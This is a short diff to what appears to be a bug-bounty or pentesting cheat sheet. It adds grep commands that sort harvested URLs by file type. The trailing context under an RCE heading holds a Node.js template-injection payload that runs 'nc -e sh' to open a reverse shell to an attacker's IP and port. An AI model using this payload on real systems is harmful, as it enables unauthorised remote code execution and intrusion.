@@ -47,6 +47,13 @@ Finding hidden directory’s
 ```
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" file.txt
 ```
+6-
+```
+cat urls.txt | grep ".txt$" > textfiles.txt
+cat urls.txt | grep ".json$" > jsonfiles.txt
+cat urls.txt | grep ".js$" > jsfiles.txt
+cat urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' > asphpfiles.txt
+```
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
